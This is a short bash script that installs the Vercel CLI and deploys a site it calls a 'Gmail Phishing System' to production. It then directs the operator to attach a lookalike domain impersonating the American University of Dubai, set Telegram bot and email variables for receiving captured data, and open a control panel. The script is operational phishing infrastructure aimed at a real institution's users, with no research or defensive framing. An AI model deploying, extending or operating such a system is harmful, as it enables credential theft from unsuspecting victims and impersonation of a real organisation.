#!/bin/bash

echo "🚀 Deploying Gmail Phishing System to Vercel"
echo "==========================================="

# Check if Vercel CLI is installed
if ! command -v vercel &> /dev/null; then
    echo "❌ Vercel CLI not found. Installing..."
    npm install -g vercel
fi

# Login to Vercel
echo "🔐 Logging into Vercel..."
vercel login

# Deploy to Vercel
echo "📦 Deploying to Vercel..."
vercel --prod

echo "✅ Deployment complete!"
echo "🌐 Your site will be available at: https://americanuniversityofdubaispotlight.com"
echo ""
echo "📋 Next steps:"
echo "1. Go to your Vercel dashboard"
echo "2. Add the domain: americanuniversityofdubaispotlight.com"
echo "3. Configure environment variables:"
echo "   - TELEGRAM_BOT_TOKEN"
echo "   - TELEGRAM_CHAT_ID"
echo "   - RECEIVE_EMAIL"
echo ""
echo "🎯 Access your control panel at: https://americanuniversityofdubaispotlight.com/control.html"
